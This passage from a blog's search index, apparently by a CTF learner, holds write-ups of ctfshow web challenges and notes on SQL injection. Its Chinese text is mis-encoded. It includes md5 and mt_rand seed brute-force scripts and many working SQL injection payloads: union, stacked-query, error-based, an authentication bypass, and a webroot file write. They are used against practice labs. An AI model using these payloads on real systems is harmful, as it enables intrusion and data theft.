<h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">if(isset($_GET[&#x27;token&#x27;]))&#123;</span><br><span class="line">    $token = md5($_GET[&#x27;token&#x27;]);</span><br><span class="line">    if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123;</span><br><span class="line">        if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>çˆ†ç ´è„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;asdfghjklqwertyuiopzxcvbnm1234567890&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">36</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">36</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="variable">$token</span>=<span class="variable">$a</span>[<span class="variable">$i</span>].<span class="variable">$a</span>[<span class="variable">$j</span>];</span><br><span class="line">        <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$token</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$a</span>[<span class="variable">$i</span>].<span class="variable">$a</span>[<span class="variable">$j</span>];</span><br><span class="line">                <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="number">3</span>j</span><br></pre></td></tr></table></figure>

<h2 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">if(isset($_GET[&#x27;r&#x27;]))&#123;</span><br><span class="line">    $r = $_GET[&#x27;r&#x27;];</span><br><span class="line">    mt_srand(372619038);</span><br><span class="line">    if(intval($r)===intval(mt_rand()))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    echo system(&#x27;cat /proc/version&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mt_srand() //æ’­ç§ Mersenne Twister éšæœºæ•°ç”Ÿæˆå™¨ã€‚</span><br><span class="line">mt_rand()   //ç”Ÿæˆéšæœºæ•°</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬ä¼šå‘ç°å½“ç§å­ä¸å˜æ—¶ï¼Œå®é™…ä¸Šç”Ÿæˆçš„éšæœºæ•°æ˜¯å›ºå®šçš„ã€‚è€Œè¿™å°±æ˜¯ä¼ªéšæœºæ•°æ¼æ´</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(372619038);</span><br><span class="line">echo (mt_rand());</span><br><span class="line">1155388967</span><br></pre></td></tr></table></figure>

<h2 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">if(isset($_GET[&#x27;r&#x27;]))&#123;</span><br><span class="line">    $r = $_GET[&#x27;r&#x27;];</span><br><span class="line">    mt_srand(hexdec(substr(md5($flag), 0,8)));</span><br><span class="line">    $rand = intval($r)-intval(mt_rand());</span><br><span class="line">    if((!$rand))&#123;</span><br><span class="line">        if($_COOKIE[&#x27;token&#x27;]==(mt_rand()+mt_rand()))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo $rand;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    echo system(&#x27;cat /proc/version&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å·²çŸ¥éšæœºæ•°çˆ†ç ´ç§å­</p>
<p>ä½¿ç”¨å·¥å…·<a href="https://www.openwall.com/php_mt_seed/">php_mt_seed - PHP mt_rand() seed cracker (openwall.com)</a></p>
<p><a href="https://www.openwall.com/php_mt_seed/php_mt_seed-4.0.tar.gz">php_mt_seed 4.0</a></p>
<p>ä¸‹è½½è§£å‹ï¼Œè¿›å…¥ç›®å½•</p>
<ul>
<li>make</li>
<li>time .&#x2F;php_mt_seed 989670016</li>
</ul>
<p><img src="/2023/04/29/%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20230501185137.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">2838855227</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"><span class="number">989670016</span></span><br><span class="line"><span class="number">3064661505</span></span><br></pre></td></tr></table></figure>

<p>&#x2F;?r&#x3D;989670016</p>
<p>cookie: token&#x3D;3064661505</p>
<h2 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h2><p>çˆ†ç ´å³å¯</p>
<p>å¯†ç  7758521</p>
<h2 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h2><p>æŠ“ä¸åˆ°åŒ…ã€‚ã€‚ã€‚å†™ä¸äº†</p>
<h2 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h2><p>ç»§ç»­çˆ†ç ´ä¸€ä¸‹ç›®å½•</p>
<p><code>[1cd8c3a3-5c30-4219-93aa-489569d67004.challenge.ctf.show/0/1/2.txt](http://1cd8c3a3-5c30-4219-93aa-489569d67004.challenge.ctf.show/0/1/2.txt)</code></p>
<p>å»æ‰2.txt</p>
<p>é›†æŸç‚¸å¼¹ cluster bomb çˆ†ç ´ä¸€ä¸€ä¸‹</p>
<p>çˆ†ç ´ç»“æœ&#x2F;72&#x2F;20&#x2F;</p>
<h2 id="ctfshowèŒæ–°æ¯web16"><a href="#ctfshowèŒæ–°æ¯web16" class="headerlink" title="ctfshowèŒæ–°æ¯web16"></a>ctfshowèŒæ–°æ¯web16</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">\<span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&quot;ctfshow<span class="subst">$c</span>&quot;</span>)===<span class="string">&quot;a6f57ae38a22448c2f07f3f95f49c84e&quot;</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;nonono!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è§£é¢˜æ€è·¯</p>
<p>mport hashlib #å»ºç«‹çˆ†ç ´çš„å­—å…¸str str&#x3D;â€™abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890+-*&#x2F;â€˜ #ä»ä¸€ä¸ªå­—ç¬¦å¼€å§‹å°è¯•ï¼Œé€æ¸å¾€ä¸‹åŠ  for i in str: for j in str : for k in str: s&#x3D;hashlib.md5((â€˜ctfshowâ€™+i+j+k).encode()).hexdigest() #è®©ctfshowå’Œå­—ç¬¦i,j,kæ‹¼æ¥åœ¨ä¸€èµ·ï¼Œè½¬åŒ–ä¸ºMD5å€¼ï¼Œhexdigestå‡½æ•°å®ç°å­—ç¬¦å­˜å‚¨ if s&#x3D;&#x3D; â€˜a6f57ae38a22448c2f07f3f95f49c84eâ€™:#åˆ¤æ–­å€¼æ˜¯å¦ç¬¦åˆæ¡ä»¶ print(i+j+k)#è¾“å‡ºå­—ç¬¦cçš„å€¼ è„šæœ¬è¾“å‡º36d æ„é€ payload: ?c&#x3D;36d å¾—å‡ºflag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">str1=&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="line">payload=&#x27;&#x27;</span><br><span class="line">for i in str1:</span><br><span class="line">    for j in str1:</span><br><span class="line">        for k in str1:</span><br><span class="line">            s = hashlib.md5((&#x27;ctfshow&#x27;+i+j+k).encode()).hexdigest()</span><br><span class="line">            #print(type(s))</span><br><span class="line">            if s==&#x27;a6f57ae38a22448c2f07f3f95f49c84e&#x27;:</span><br><span class="line">                print(i+j+k)</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import string</span><br><span class="line">a=string.ascii_letters+string.digits</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>ctfhsow</tag>
      </tags>
  </entry>
  <entry>
    <title>easysql</title>
    <url>/2023/03/23/%E7%AE%80%E5%8D%95sql/</url>
    <content><![CDATA[<p> æˆ‘æ˜¯èœç‹—ã€‚</p>
  <span id="more"></span>

<p>[toc]</p>
<h2 id="mysql-information-schema"><a href="#mysql-information-schema" class="headerlink" title="mysql-information_schema"></a>mysql-information_schema</h2><p>æŸ¥çœ‹æ•°æ®åº“ï¼Œåœ¨<strong>schemata</strong>è¡¨ä¸­ï¼Œ<strong>schema_name</strong>å­—æ®µä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select schema_name from information_schema.schemata</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æ•°æ®åº“çš„è¡¨å ï¼Œåœ¨<strong>tables</strong>è¡¨ä¸­ï¼Œ<strong>table_name</strong>å­—æ®µä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&#x27;æ•°æ®åº“å&#x27;</span><br></pre></td></tr></table></figure>

<p>çŒœè¡¨çš„åˆ—åï¼Œåœ¨<strong>columns</strong>è¡¨ä¸­ï¼Œ<strong>column_name</strong>å­—æ®µä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Select column_name from information_schema.columns where table_name=&#x27;æ•°æ®è¡¨å&#x27;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/Lee-404/p/12833788.html">æ— åˆ—åæ³¨å…¥ - Lee-404 - åšå®¢å›­ (cnblogs.com)</a></p>
<h2 id="union-è”åˆæ³¨å…¥"><a href="#union-è”åˆæ³¨å…¥" class="headerlink" title="union è”åˆæ³¨å…¥"></a>union è”åˆæ³¨å…¥</h2><p>ä¾æ¬¡åˆ¤æ–­ç±»å‹ï¼Œå­—æ®µæ•°ï¼Œå›æ˜¾ç‚¹ï¼Œä¾æ¬¡çˆ†åº“åï¼Œè¡¨åï¼Œå­—æ®µåï¼Œæ•°æ®<br>unionæœ‰ä¸€ä¸ªååˆ†ä¸¥æ ¼çš„çº¦æŸæ¡ä»¶ï¼Œå› ä¸ºæ˜¯è”åˆæŸ¥è¯¢ï¼Œå¿…é€‰ä¿è¯å­—æ®µæ•°ä¸€è‡´ï¼Œå³ä¸¤ä¸ªæŸ¥è¯¢ç»“æœæœ‰ç›¸åŒçš„åˆ—æ•°ï¼Œå› æ­¤æˆ‘ä»¬è¦å¯¹å­—æ®µæ•°è¿›è¡Œåˆ¤æ–­</p>
<p>ctfshow web2;</p>
<p>æŸ¥çœ‹å½“å‰æ•°æ®åº“åç§°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,database(),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æ•°æ®åº“è¡¨çš„æ•°é‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select count(*) from information_schema.tables where table_schema = &#x27;web2&#x27;),3 limit 1,2;#--</span><br></pre></td></tr></table></figure>

<p>æ•°é‡ä¸º2</p>
<p>æŸ¥ç¬¬ä¸€ä¸ªè¡¨çš„åå­—ï¼Œ**ç¬¬ä¸€ä¸ªè¡¨:**flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select table_name from information_schema.tables where table_schema = &#x27;web2&#x27; limit 0,1),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p><strong>æŸ¥flagè¡¨åˆ—çš„æ•°é‡</strong>,</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select count(*) from information_schema.columns where table_name = &#x27;flag&#x27; limit 0,1),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p><strong>æŸ¥flagè¡¨åˆ—çš„åå­—</strong>   <em>åˆ—åä¸ºflag</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select column_name from information_schema.columns where table_name = &#x27;flag&#x27; limit 0,1),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p><strong>æŸ¥flagè¡¨è®°å½•çš„æ•°é‡</strong>        æ•°é‡ä¸º1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select count(*) from flag),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p><strong>æŸ¥flagè¡¨è®°å½•å€¼</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select flag from flag limit 0,1),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p>1â€™ union select 1,password from ctfshow_user5 where username&#x3D;â€™flagâ€™ into outfile â€˜&#x2F;var&#x2F;www&#x2F;html&#x2F;ctf.txtâ€™ â€“ A#ç”Ÿæˆå¹¶ä¿å­˜åœ¨ç½‘é¡µç›®å½•ä¸‹ctf.txtæ–‡ä»¶#ctfshowweb175</p>
<p>  if(!preg_match(â€˜&#x2F;[\x00-\x7f]&#x2F;iâ€™, json_encode($ret))){<br>      $ret[â€˜msgâ€™]&#x3D;â€™æŸ¥è¯¢æˆåŠŸâ€™;<br>    }<br>sql å­—ç¬¦æ³¨å…¥ç»•è¿‡ ç©ºæ ¼ %09(tab)Â %20( )æ³¨é‡Šç»•è¿‡&#x2F;**&#x2F;%0a%0b%0c<br> return preg_match(â€˜&#x2F; |*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|#|file|into|select&#x2F;iâ€™, $str);<br>%23(#)Â </p>
<p>-1â€™or(id&#x3D;26)andâ€™aâ€™&#x3D;â€™aÂ  Â  Â  Â  Â  Â #æ‹¬å·ç»•è¿‡ç©ºæ ¼ ctfshow180<br>-1â€™ or username &#x3D; â€˜flagâ€™ â€“+</p>
<h2 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h2><p>æ”»é˜²ä¸–ç•Œsupersqli</p>
<h3 id="æŸ¥çœ‹å­—æ®µ"><a href="#æŸ¥çœ‹å­—æ®µ" class="headerlink" title="æŸ¥çœ‹å­—æ®µ"></a>æŸ¥çœ‹å­—æ®µ</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by  2 #</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æ•°æ®åº“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show databases;--+</span><br></pre></td></tr></table></figure>

<p>æŸ¥è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;;use supersqli;show tables;#</span><br></pre></td></tr></table></figure>

<p>æŸ¥å­—æ®µ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; show columns from `1919810931114514` ;--+</span><br></pre></td></tr></table></figure>

<p>å‘ç°flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; show columns from `words` ;--+</span><br></pre></td></tr></table></figure>



<p>handleræŸ¥è¯¢</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1â€™;handler 1919810931114514 open;handler 1919810931114514 read first;#</span><br></pre></td></tr></table></figure>

<p> 1ã€æ‰“å¼€å¥æŸ„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler handler_table open;</span><br></pre></td></tr></table></figure>

<h3 id="æŸ¥çœ‹æ•°æ®"><a href="#æŸ¥çœ‹æ•°æ®" class="headerlink" title="æŸ¥çœ‹æ•°æ®"></a>æŸ¥çœ‹æ•°æ®</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler handler_table read first; //è·å–ç¬¬ä¸€è¡Œ</span><br><span class="line">handler handler_table read next; //è·å–ä¸‹ä¸€è¡Œ</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…é€šè¿‡æ”¹è¡¨å</p>
<p>æ ¹æ®åœ¨wordsè¡¨é‡Œå‘ç°idå­—æ®µä¸æŸ¥è¯¢æ¡†é‡Œçš„å‡ºçš„æ•°æ®ç±»å‹ç›¸åŒï¼Œä¸€ä¸ªæ•°å­—ï¼Œä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥çŒœæµ‹é»˜è®¤æŸ¥è¯¢çš„å°±æ˜¯wordsè¡¨ï¼Œinjectï¼ˆæœç´¢æ¡†ä¸­ï¼‰å€¼åº”è¯¥èµ‹ç»™äº†id<br>åˆ©ç”¨ï¼šæˆ‘ä»¬å¯ä»¥å°†å«æœ‰flagå­—æ®µçš„è¡¨å‘½åä¸ºwordï¼Œç„¶åä¿®æ”¹å­—æ®µåå­—ï¼Œä¸å°±æŸ¥è¯¢åˆ°æˆ‘ä»¬æƒ³è¦çš„ç»“æœï¼ï¼ˆå‰ææ˜¯è¿™é‡Œrenameï¼Œalertå…³é”®å­— æ²¡æœ‰åšè¿‡æ»¤ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 ; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50); #</span><br><span class="line"> æ‹†å¼€ï¼š</span><br><span class="line">1;  alter tables words rename to words1; </span><br><span class="line">1;  alter tables `1919810931114514` rename to words ;</span><br><span class="line">1;  alter tables words change flag id varchar(50); #</span><br></pre></td></tr></table></figure>

<p>ä¸‡èƒ½å¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1 #</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;c168d583ed0d4d7196967b28cbd0b5e9&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/l2872253606/article/details/123362430">(5æ¡æ¶ˆæ¯) æ”»é˜²ä¸–ç•Œä¹‹supersqli_æ”»é˜²ä¸–ç•Œsupersqli_é‡‘ å¸›çš„åšå®¢-CSDNåšå®¢</a></p>
<h2 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h2><p>åˆ©ç”¨xpathè¯­æ³•é”™è¯¯æ¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥ä¸»è¦åˆ©ç”¨<code>extractvalue</code>å’Œ<code>updatexml</code>ä¸¤ä¸ªå‡½æ•°</p>
<p>extractvalueå‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‡½æ•°åŸå‹ï¼šextractvalue(xml_document,Xpath_string)</span><br><span class="line">æ­£å¸¸è¯­æ³•ï¼šextractvalue(xml_document,Xpath_string);</span><br><span class="line">ç¬¬ä¸€ä¸ªå‚æ•°ï¼šxml_documentæ˜¯stringæ ¼å¼ï¼Œä¸ºxmlæ–‡æ¡£å¯¹è±¡çš„åç§°</span><br><span class="line">ç¬¬äºŒä¸ªå‚æ•°ï¼šXpath_stringæ˜¯xpathæ ¼å¼çš„å­—ç¬¦ä¸²</span><br><span class="line">ä½œç”¨ï¼šä»ç›®æ ‡xmlä¸­è¿”å›åŒ…å«æ‰€æŸ¥è¯¢å€¼çš„å­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure>

<p> â‘  0x7e&#x3D;â€™<del>â€™<br> â‘¡ concat(â€˜aâ€™,â€˜bâ€™)&#x3D;â€œabâ€<br> â‘¢ version()&#x3D;@@version<br> â‘£ â€˜</del>â€˜å¯ä»¥æ¢æˆâ€™#â€™ã€â€™$â€™ç­‰ä¸æ»¡è¶³xpathæ ¼å¼çš„å­—ç¬¦<br> â‘¤ extractvalue()èƒ½æŸ¥è¯¢å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ä¸º32ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦çš„ç»“æœè¶…è¿‡32ï¼Œå°±è¦ç”¨substring()å‡½æ•°æˆªå–æˆ–limitåˆ†é¡µï¼Œä¸€æ¬¡æŸ¥çœ‹æœ€å¤š32ä½</p>
<p>updatexmlå‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‡½æ•°åŸå‹ï¼šupdatexml(xml_document,xpath_string,new_value)</span><br><span class="line">æ­£å¸¸è¯­æ³•ï¼šupdatexml(xml_document,xpath_string,new_value)</span><br><span class="line">ç¬¬ä¸€ä¸ªå‚æ•°ï¼šxml_documentæ˜¯stringæ ¼å¼ï¼Œä¸ºxmlæ–‡æ¡£å¯¹è±¡çš„åç§° ç¬¬äºŒä¸ªå‚æ•°ï¼šxpath_stringæ˜¯xpathæ ¼å¼çš„å­—ç¬¦ä¸²</span><br><span class="line">ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueæ˜¯stringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„è´Ÿè·æ¡ä»¶çš„æ•°æ® ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼</span><br></pre></td></tr></table></figure>



<p><a href="https://blog.csdn.net/silence1_/article/details/90812612">(8æ¡æ¶ˆæ¯) sqlæ³¨å…¥ä¹‹æŠ¥é”™æ³¨å…¥_Dar1in9çš„åšå®¢-CSDNåšå®¢</a></p>
<h3 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-error"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-error" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]error"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]error</h3><p>nssctfçš„é¢˜</p>
<p>çˆ†å‡ºæ•°æ®åº“ </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select database()))))#</span><br></pre></td></tr></table></figure>

<p>çˆ†å‡ºæ‰€æœ‰æ•°æ®åº“å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(schema_name) from information_schema.schemata))))#</span><br></pre></td></tr></table></figure>

<p>çˆ†å‡ºæ•°æ®åº“test_dbä¸‹æ‰€æœ‰çš„è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;test_db&#x27;))))#</span><br></pre></td></tr></table></figure>

<p>çˆ†å‡ºtest_dbæ•°æ®åº“ä¸‹test_tbè¡¨æ‰€æœ‰çš„åˆ—å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&quot;test_tb&quot; and table_schema=&#x27;test_db&#x27;))))#</span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select substr((select flag from test_tb), 1 , 31)))))#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select substr((select flag from test_tb), 31 , 60)))))#</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>sql</category>
      </categories>
  </entry>
</search>
